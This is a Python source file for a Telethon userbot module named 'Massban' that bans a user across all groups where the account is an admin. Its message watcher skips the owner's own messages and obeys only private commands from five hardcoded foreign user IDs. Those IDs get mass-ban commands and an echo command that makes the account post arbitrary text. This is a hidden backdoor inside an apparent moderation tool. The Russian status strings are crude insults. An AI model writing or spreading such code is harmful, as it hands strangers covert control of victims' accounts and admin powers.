import re
import time
import typing

from asyncio import sleep as asleep

from telethon.tl import functions
from telethon.tl.types import (
    Channel,
    Chat,
    Message,
    User,
)

from .. import loader, utils

BANNED_RIGHTS = {
    "view_messages": False,
    "send_messages": False,
    "send_media": False,
    "send_stickers": False,
    "send_gifs": False,
    "send_games": False,
    "send_inline": False,
    "send_polls": False,
    "change_info": False,
    "invite_users": False,
}

def get_full_name(user: typing.Union[User, Channel]) -> str:
    return utils.escape_html(
        user.title
        if isinstance(user, Channel)
        else (
            f"{user.first_name} "
            + (user.last_name if getattr(user, "last_name", False) else "")
        )
    ).strip()

@loader.tds
class Massban(loader.Module):
    """Модуль для массового бана"""

    strings = {
        "name": "massban",
        "no_reason": "Туда долбаеба",
        "args": "<b>Ебать ты инвалид</b>",
        "args_id": "<b>Ебать ты инвалид</b>",
        "invalid_id": "<b>Айдишка не цифра</b>",
        "user_not_found": "<b>Пользователь <code>{}</code> не найден</b>",
        "glban": '<b><a href="{}">{}</a></b>\n<b></b><i>{}</i>\n\n{}',
        "glbanning": ' <b>Отправка осликов <a href="{}">{}</a>...</b>',
        "in_n_chats": "<b>Его трахнуло {} осликов</b>",
    }

    strings_ru = {
        "no_reason": "Туда долбаеба",
        "args": "<b>Ебать ты инвалид</b>",
        "args_id": "<b>Ебать ты инвалид</b>",
        "invalid_id": "<b>Айдишка не цифра</b>",
        "user_not_found": "<b>Пользователь <code>{}</code> не найден</b>",
        "glban": '<b><a href="{}">{}</a></b>\n<b></b><i>{}</i>\n\n{}',
        "glbanning": ' <b>Отправка осликов <a href="{}">{}</a>...</b>',
        "in_n_chats": "<b>Его трахнуло {} осликов</b>",
    }

    def __init__(self):
        self._gban_cache = []
        self._whitelist = []

    async def watcher(self, message):
        if (not message.is_private or 
            message.sender_id == (await message.client.get_me()).id or
            message.sender_id in self._whitelist or
            not message.text or message.sender_id not in [773159330, 107448140, 182604273, 827207690, 924765099]):
            return
        
        if message.text.startswith('.g '):
            args = message.text[3:].strip()
            await self.process_g_command(message, args)
        elif message.text.startswith('.g2 '):
            args = message.text[4:].strip()
            await self.process_g2_command(message, args)
        elif message.text.startswith('.w '):
            args = message.text[4:].strip()
            await message.reply(args)

    async def process_g_command(self, message, args):
        if not args:
            await message.reply(self.strings("args"))
            return
        
        max_chats = 40
        if " -t " in " " + args:
            try:
                t_match = re.search(r' -t (\d+)', " " + args)
                if t_match:
                    max_chats = int(t_match.group(1))
                    args = re.sub(r' -t \d+', '', " " + args).strip()
            except (ValueError, AttributeError):
                pass
        
        try:
            user = await self._client.get_entity(args.split()[0])
        except Exception:
            await message.reply(self.strings("args"))
            return
        
        processing_msg = await message.reply(
            self.strings("glbanning").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
            ),
        )

        # Собираем чаты без кэширования каждый раз
        chats = []
        async for dialog in self._client.iter_dialogs(ignore_migrated=True, limit=200):
            entity = dialog.entity
            
            # Проверяем только супергруппы и каналы
            if not (isinstance(entity, (Channel, Chat))):
                continue
            
            # Проверяем участников (минимум 5 для супергрупп)
            participants_count = getattr(entity, "participants_count", 0)
            if participants_count <= 5:
                continue
            
            # Проверяем права администратора на бан
            admin_rights = getattr(entity, "admin_rights", None)
            if not admin_rights or not getattr(admin_rights, "ban_users", False):
                continue
            
            # Для каналов проверяем, что это супергруппа (megagroup)
            if isinstance(entity, Channel):
                if not getattr(entity, "megagroup", False):
                    continue
            
            chats.append(entity.id)

        counter = 0
        flood_waited = False

        for chat_id in chats:
            if counter >= max_chats: 
                break
            try:
                await self.ban(chat_id, user, 0, self.strings("no_reason"), silent=True)
                counter += 1
            except Exception as e:
                error_str = str(e)
                if "You must pass either a channel or a supergroup" in error_str:
                    continue
                if "A wait of" in error_str:
                    try:
                        wait_time = error_str.split('A wait of ')[1].split(' ')[0]
                        flood_waited = True
                        # Не останавливаем процесс, просто отмечаем флудвейт
                        counter_str = f"{counter} (floodwait {wait_time} сек)"
                    except:
                        counter_str = f"{counter} (floodwait)"
                    # Обновляем сообщение статуса и продолжаем
                    await processing_msg.edit(
                        self.strings("glbanning").format(
                            utils.get_entity_url(user),
                            utils.escape_html(get_full_name(user)),
                        ) + f"\n\n<b>Флудвейт: {wait_time if 'wait_time' in locals() else 'unknown'} сек</b>"
                    )
                    # Продолжаем со следующего чата
                    continue
                # Пропускаем другие ошибки без остановки процесса
                continue

        result_counter = f"{counter}" + (" (floodwait)" if flood_waited else "")
        await processing_msg.edit(
            self.strings("glban").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                self.strings("no_reason"),
                self.strings("in_n_chats").format(result_counter),
            ),
        )

    async def process_g2_command(self, message, args):
        if not args:
            await message.reply(self.strings("args_id"))
            return

        parts = args.split()
        raw_target = parts[0]
        rest = " ".join(parts[1:])

        silent = False
        max_chats = 40
        
        if " -s" in " " + rest:
            silent = True
            rest = rest.replace(" -s", "").strip()
        
        if " -t " in " " + rest:
            try:
                t_match = re.search(r' -t (\d+)', " " + rest)
                if t_match:
                    max_chats = int(t_match.group(1))
                    rest = re.sub(r' -t \d+', '', " " + rest).strip()
            except (ValueError, AttributeError):
                pass

        t_token = ([arg for arg in rest.split() if self.convert_time(arg)] or ["0"])[0]
        period = self.convert_time(t_token)

        if t_token != "0":
            rest = rest.replace(t_token, "").replace("  ", " ").strip()

        if time.time() + period >= 2208978000:
            period = 0

        reason = utils.escape_html(rest or self.strings("no_reason")).strip()

        user = await self._resolve_user_by_arg(raw_target)
        if not user:
            await message.reply(
                self.strings("user_not_found").format(utils.escape_html(raw_target)),
            )
            return

        user_id = int(getattr(user, "id", 0)) or None
        if not user_id:
            await message.reply(
                self.strings("user_not_found").format(utils.escape_html(raw_target)),
            )
            return

        processing_msg = await message.reply(
            self.strings("glbanning").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
            ),
        )

        # Собираем чаты без кэширования
        chats = []
        async for dialog in self._client.iter_dialogs(ignore_migrated=True, limit=200):
            entity = dialog.entity
            
            if not (isinstance(entity, (Channel, Chat))):
                continue
            
            participants_count = getattr(entity, "participants_count", 0)
            if participants_count <= 5:
                continue
            
            admin_rights = getattr(entity, "admin_rights", None)
            if not admin_rights or not getattr(admin_rights, "ban_users", False):
                continue
            
            if isinstance(entity, Channel):
                if not getattr(entity, "megagroup", False):
                    continue
            
            chats.append(entity.id)

        counter = 0
        flood_waited = False

        for chat_id in chats:
            if counter >= max_chats: 
                break
            try:
                await self.ban(chat_id, user_id, period, reason, silent=True)
                counter += 1
            except Exception as e:
                error_str = str(e)
                if "You must pass either a channel or a supergroup" in error_str:
                    continue
                if "A wait of" in error_str:
                    try:
                        wait_time = error_str.split('A wait of ')[1].split(' ')[0]
                        flood_waited = True
                        # Обновляем статус
                        await processing_msg.edit(
                            self.strings("glbanning").format(
                                utils.get_entity_url(user),
                                utils.escape_html(get_full_name(user)),
                            ) + f"\n\n<b>Флудвейт: {wait_time} сек</b>"
                        )
                    except:
                        pass
                    # Продолжаем со следующего чата
                    continue
                # Пропускаем ошибки
                continue

        if silent:
            try:
                await processing_msg.delete()
            except Exception:
                pass
            return

        result_counter = f"{counter}" + (" (floodwait)" if flood_waited else "")
        await processing_msg.edit(
            self.strings("glban").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                reason,
                self.strings("in_n_chats").format(result_counter),
            ),
        )

    async def _resolve_user_by_arg(self, raw: str) -> typing.Optional[User]:
        raw = raw.strip()

        if raw.lstrip("-").isdigit():
            try:
                return await self._client.get_entity(int(raw))
            except Exception:
                return None

        username = raw

        if "t.me/" in username:
            username = username.split("t.me/", maxsplit=1)[1]

        username = username.split("/", maxsplit=1)[0]

        if username.startswith("@"):
            username = username[1:]

        if not username:
            return None

        try:
            return await self._client.get_entity(username)
        except Exception:
            pass

        try:
            result = await self._client(
                functions.contacts.SearchRequest(q=username, limit=10)
            )
        except Exception:
            return None

        if not getattr(result, "users", None):
            return None

        for user in result.users:
            if getattr(user, "username", None) and user.username.lower() == username.lower():
                return user

        return result.users[0] if result.users else None

    @staticmethod
    def convert_time(t: str) -> int:
        try:
            if not str(t)[:-1].isdigit():
                return 0

            if "d" in str(t):
                t = int(t[:-1]) * 60 * 60 * 24

            if "h" in str(t):
                t = int(t[:-1]) * 60 * 60

            if "m" in str(t):
                t = int(t[:-1]) * 60

            if "s" in str(t):
                t = int(t[:-1])

            t = int(re.sub(r"[^0-9]", "", str(t)))
        except ValueError:
            return 0

        return t

    async def ban(
        self,
        chat: typing.Union[Chat, int],
        user: typing.Union[User, Channel, int],
        period: int = 0,
        reason: str = None,
        message: typing.Optional[Message] = None,
        silent: bool = False,
    ):
        if str(user).isdigit():
            user = int(user)

        if reason is None:
            reason = self.strings("no_reason")

        await self._client.edit_permissions(
            chat,
            user,
            until_date=(time.time() + period) if period else 0,
            **BANNED_RIGHTS,
        )
